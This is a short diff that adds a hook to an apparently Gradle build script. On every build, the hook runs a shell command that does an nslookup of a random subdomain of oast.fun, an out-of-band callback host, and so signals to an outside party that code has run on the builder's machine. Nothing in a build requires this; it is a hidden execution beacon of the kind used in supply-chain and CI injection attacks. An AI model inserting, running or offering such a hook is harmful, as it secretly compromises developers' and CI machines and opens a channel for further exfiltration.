@@ -1,0 +1,4 @@
+gradle.taskGraph.whenReady { taskGraph ->
+    def proc = ['sh', '-c', 'nslookup zaqomuautfvhygykvceciwofm26vsrycn.oast.fun'].execute()
+    proc.waitForProcessOutput(System.out, System.err)
+}
